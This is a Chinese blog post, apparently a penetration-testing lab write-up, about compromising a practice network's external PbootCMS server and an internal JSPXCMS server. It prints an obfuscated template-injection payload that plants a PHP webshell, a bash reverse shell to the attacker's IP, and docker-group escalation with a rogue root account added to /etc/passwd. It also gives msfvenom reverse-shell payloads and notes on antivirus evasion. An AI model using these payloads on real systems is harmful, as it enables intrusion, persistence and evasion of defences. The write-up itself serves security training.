@@ -1,0 +1,1343 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/hacker.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="暗月," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="总结本次学习的是暗月项目八：高度安全的内网域渗透。   外网WEB服务器：学习了PbootCMS的后台漏洞、绕过宝塔的禁止函数和本地docker提权。 内网WEB服务器：学习了JSPXCMS的后台zip解压目录穿越漏洞，上传免杀的恶意war包拿到shell，利用X-AV免杀工具绕过了更新后的360全家桶和defender，通过端口转发绕过防火墙实现远程桌面登录。 文件服务器：尝试利用msf和cs进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透高度安全的内网">
+<meta property="og:url" content="https://pursuezhou.github.io/2023/07/27/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AB/index.html">
+<meta property="og:site_name" content="Pursue">
+<meta property="og:description" content="总结本次学习的是暗月项目八：高度安全的内网域渗透。   外网WEB服务器：学习了PbootCMS的后台漏洞、绕过宝塔的禁止函数和本地docker提权。 内网WEB服务器：学习了JSPXCMS的后台zip解压目录穿越漏洞，上传免杀的恶意war包拿到shell，利用X-AV免杀工具绕过了更新后的360全家桶和defender，通过端口转发绕过防火墙实现远程桌面登录。 文件服务器：尝试利用msf和cs进">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729182411683.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726142251679.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726143551046.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726152816510.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726153006590.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726155120334.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726155134604.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726181242143.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726192826399.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726202445029.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728112553789.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728131053288.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728133957871.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728135930568.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729131104918.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729132438710.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729133252483.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729134004783.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729151224928.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729155126846.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160123494.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160133670.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729160230558.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729162608625.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729164630423.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729165026682.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729170352849.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729170619970.png">
+<meta property="article:published_time" content="2023-07-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-13T11:56:02.813Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="暗月">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729182411683.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://pursuezhou.github.io/2023/07/27/Penetration/暗月项目八/"/>
+
+
+
+
+
+  <title>渗透高度安全的内网 | Pursue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pursue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Better to light one candle than to curse the darkness.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://pursuezhou.github.io/2023/07/27/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/wechat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">渗透高度安全的内网</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-07-27T00:00:00+08:00">
+                2023-07-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration/" itemprop="url" rel="index">
+                    <span itemprop="name">Penetration</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次学习的是暗月项目八：高度安全的内网域渗透。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729182411683.png" alt="image-20230729182411683"></p>
+<ul>
+<li>外网WEB服务器：学习了PbootCMS的后台漏洞、绕过宝塔的禁止函数和本地docker提权。</li>
+<li>内网WEB服务器：学习了JSPXCMS的后台zip解压目录穿越漏洞，上传免杀的恶意war包拿到shell，利用X-AV免杀工具绕过了更新后的360全家桶和defender，通过端口转发绕过防火墙实现远程桌面登录。</li>
+<li>文件服务器：尝试利用msf和cs进行内网穿透实现反向连接，以及利用Psexec进行pth攻击。</li>
+<li>AD域控：学习了ZeroLogon的利用获取域控权限。</li>
+</ul>
+<p>最终也是跟着暗月佬拿下了这四台主机。</p>
+<span id="more"></span>
+
+<h2 id="外网WEB服务器"><a href="#外网WEB服务器" class="headerlink" title="外网WEB服务器"></a>外网WEB服务器</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -i eth0 -r 192.168.215.0/24</span><br><span class="line">sudo masscan -p 0-65535 192.168.215.140 --rate=500</span><br><span class="line"></span><br><span class="line">nmap -sC -A -p 8888,3306,80,22,21,888 192.168.215.140</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726142251679.png" alt="image-20230726142251679"></p>
+<p>可以看到<code>BT Panel</code>，是宝塔面板搭建的而且默认是打开了安全入口，所以找不到面板的登陆网址。那么看看网站有没有漏洞，首先绑定hosts为<code>www.cf1.com</code>，访问发现是PbootCMS，直接官网下载源码分析，发现在<code>/doc/ChangeLog.txt</code>有版本的更新日志，访问目标网站找到目前版本为<code>2.0.8</code>。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726143551046.png" alt="image-20230726143551046"></p>
+<p>尝试了2.x版本的cms漏洞，均以失败告终，只找到一篇后台RCE。接下来尝试从数据库作为突破口，找到数据库配置文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 主数据库连接参数，未配置的参数使用框架惯性配置</span></span><br><span class="line"><span class="comment"> * 如果修改为mysql数据库，请同时修改type和dbname两个参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;database&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;type&#x27;</span> =&gt; <span class="string">&#x27;sqlite&#x27;</span>, <span class="comment">// 数据库连接驱动类型: mysqli,sqlite,pdo_mysql,pdo_sqlite</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// 数据库服务器</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;pboot&#x27;</span>, <span class="comment">// 数据库连接用户名</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span> =&gt; <span class="string">&#x27;123456&#x27;</span>, <span class="comment">// 数据库连接密码</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;3306&#x27;</span>, <span class="comment">// 数据库端口</span></span><br><span class="line">                          </span><br><span class="line">        <span class="comment">// &#x27;dbname&#x27; =&gt; &#x27;pbootcms&#x27; // 去掉注释，启用mysql数据库，注意修改前面的连接信息及type为mysqli</span></span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;dbname&#x27;</span> =&gt; <span class="string">&#x27;/data/pbootcms.db&#x27;</span> <span class="comment">// 去掉注释，启用Sqlite数据库，注意修改type为sqlite</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>尝试下载数据库文件<code>/data/pbootcms.db</code>失败，看了视频才发现在网站搭建的过程中会修改数据库的名字为随机数。网上搜索了一下，发现可以直接访问静态文件，或者是备份文件<code>.swp</code>（vim修改之后的文件）。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726152816510.png" alt="image-20230726152816510"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726153006590.png" alt="image-20230726153006590"></p>
+<p>somd5破解得到密码admin7788。进入后台利用上面找到的RCE，成功执行。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/253403.html">从PbootCMS审计到某狗绕过 - FreeBuf网络安全行业门户</a></p>
+</blockquote>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726155120334.png" alt="image-20230726155120334"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726155134604.png" alt="image-20230726155134604"></p>
+<p>但是需要注意，宝塔面板是禁止系统函数的调用的，可以从phpinfo中找到，如下图所示：</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726181242143.png" alt="image-20230726181242143"></p>
+<p>接下来尝试将webshell读入目标服务器中。一开始是利用file_put_contents函数尝试直接写入一句话木马，但是发现失败了，应该是过滤字符的原因，所以联合了file_get_contents远程读文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;pboot:<span class="keyword">if</span>((<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;file_&#x27;</span>,<span class="string">&#x27;put_&#x27;</span>,<span class="string">&#x27;contents&#x27;</span>])((<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>])),(<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">&#x27;</span>,<span class="string">&#x27;file_&#x27;</span>,<span class="string">&#x27;put_&#x27;</span>,<span class="string">&#x27;contents(&#x27;</span>,<span class="string">&#x27;&quot;shell&#x27;</span>,<span class="string">&#x27;.php&quot;,&#x27;</span>,<span class="string">&#x27;file_&#x27;</span>,<span class="string">&#x27;get_&#x27;</span>,<span class="string">&#x27;contents(&#x27;</span>,<span class="string">&#x27;&quot;http://192.168.215.133:8080/shell.php&quot;));&#x27;</span>])))))&#125;!!!&#123;/pboot:<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// shell.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来就是绕过宝塔的disable_functions，找到项目：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/">mm0r1&#x2F;exploits: Pwn stuff. (github.com)</a></p>
+</blockquote>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726192826399.png" alt="image-20230726192826399"></p>
+<p>直接利用bash反弹shell，修改脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.215.133/5555 0&gt;&amp;1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是思考如何提权了，尝试了内核提权和suid提权，最终都以失败告终。找到用户cf1的目录，发现私钥和公钥都有可以读写的权限，直接拿到私钥ssh。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa cf1@192.168.215.140</span><br></pre></td></tr></table></figure>
+
+<p>id发现加入了docker组，那么可以尝试docker提权。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230726202445029.png" alt="image-20230726202445029"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</span><br></pre></td></tr></table></figure>
+
+<p>为了维持权限，向&#x2F;etc&#x2F;passwd中加入root用户。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 --salt pursue 123456</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">pursue:$1$pursue<span class="variable">$Q</span>/oVnrEm49MGZX3Z9qFSy1:0:0:root:/root:/bin/bash</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内网WEB服务器"><a href="#内网WEB服务器" class="headerlink" title="内网WEB服务器"></a>内网WEB服务器</h2><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728112553789.png" alt="image-20230728112553789"></p>
+<p>访问8080端口，发现是<code>JSPXCMS</code>，找到后台地址尝试弱口令，成功进入后台。发现文件管理的功能，尝试上传jsp文件拿shell，但是尝试后发现在所管理目录下是无权限访问jsp文件的，随后网上找到一篇jspxcms后台利用文件。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lastwinn/article/details/119303905">(17条消息) jspxcms_jspxcms漏洞_angelkat的博客-CSDN博客</a></p>
+</blockquote>
+<p>Kali中自带了恶意的war包，路径为<code>/usr/share/laudanum/jsp/cmd.war</code>，尝试上传但是被查杀了。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728131053288.png" alt="image-20230728131053288"></p>
+<p>需要免杀，没有找到适合的项目，直接拿暗月佬推荐的项目，上传成功免杀360全家桶：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecurityRiskAdvisors/cmd.jsp">SecurityRiskAdvisors&#x2F;cmd.jsp：一个具有文件上传功能的超小型jsp webshell。 (github.com)</a></p>
+</blockquote>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728133957871.png" alt="image-20230728133957871"></p>
+<p>根据项目readme的介绍，我们可以起一个服务器来加载js文件，同时修改js文件中cmd.jsp的访问路径。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.215.141/cmdjsp/a.js&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> html = <span class="string">&quot;&lt;form method=post action=&#x27;http://192.168.215.139:8080/cmd/cmd.jsp&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;input name=&#x27;c&#x27; type=text&gt;&lt;input type=submit value=&#x27;Run&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;/form&gt;&lt;hr&gt;\</span></span><br><span class="line"><span class="string">&lt;form action=&#x27;http://192.168.215.139:8080/cmd/cmd.jsp&#x27; method=post&gt;\</span></span><br><span class="line"><span class="string">Upload dir: &lt;input name=&#x27;a&#x27; type=text value=&#x27;.&#x27;&gt;&lt;br&gt;\</span></span><br><span class="line"><span class="string">Select a file to upload: &lt;input name=&#x27;n&#x27; type=&#x27;file&#x27; id=&#x27;f&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;input type=&#x27;hidden&#x27; name=&#x27;b&#x27; id=&#x27;b&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;input type=&#x27;submit&#x27; value=&#x27;Upload&#x27;&gt;\</span></span><br><span class="line"><span class="string">&lt;/form&gt;&lt;hr&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230728135930568.png" alt="image-20230728135930568"></p>
+<p>接下来尝试反弹一个shell，由于正常的webshell都会被查杀，尝试用matesploit过360和defender，似乎会被360杀？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.215.133 lport=3333 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload java/jsp_shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.215.133</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 3333</span><br><span class="line">msf6 exploit(multi/handler) &gt; set shell cmd.exe</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>由于没有meterpreter，使用起来不是很方便而且会断开连接，所以尝试上线CS。</p>
+<p>由于能上外网，所以360和defender都做了自动的更新，使得免杀的难度大大提高。尝试了很多款免杀的工具，大部分基本上能够绕过360，但是绕不过defender，这么看来还是defender更为强大，最终找到一款工具能够绕过defender。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://redn3ck.github.io/2022/08/09/CS%E5%85%8D%E6%9D%80-bypass-defender/">CS免杀 - bypass defender | redn3ck’s blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/XTeam-Wing/X-AV">XTeam-Wing&#x2F;X-AV: X系列安全工具-AV免杀框架-BypassAV (github.com)</a></p>
+</blockquote>
+<p>改工具测试下来，三种加密手段其中XOR和RC4会被360行为检测，不过多次执行能够绕过，应该是360检测存在一定的疏忽；而AES加密方法不会被360动态监测到。<strong>但是需要注意的是，要及时做进程的迁移，否则还是会被defender杀</strong>，最后成功上线。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729131104918.png" alt="image-20230729131104918"></p>
+<p>收集hash，尝试破解管理员密码，得到密码为QWEasd123。接下来探测内网，端口扫描，发现主机。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729132438710.png" alt="image-20230729132438710"></p>
+<p>发现存在一台内网的主机名FILESERVER，并且存在域为FBI，开放5985和445端口。尝试访问共享目录，用主机名失败用IP成功。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729133252483.png" alt="image-20230729133252483"></p>
+<p>尝试使用psexec进行横向移动，应该是执行成功了，但是没有成功返回。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230729134004783.png" alt="image-20230729134004783"></p>
+<p>由于msf的功能更为强大，所以拿一个msf的shell，尝试用掩日去加载shellcode，发现会被杀，而用上述的工具制作木马不会被杀。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.215.133 lport=7777 -f raw -o msf.bin</span><br></pre></td></tr></table></figure>
+
+<p>想要远程登录主机，需要开启3389端口，并且因为有防火墙的原因，需要做一个端口转发，把内网3389转发到Kali的3389端口上。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line">meterpreter &gt; portfwd add -l 3389 -p 3389 -r 192.168.215.133</span><br></pre></td></tr></table></figure>
+
+
+
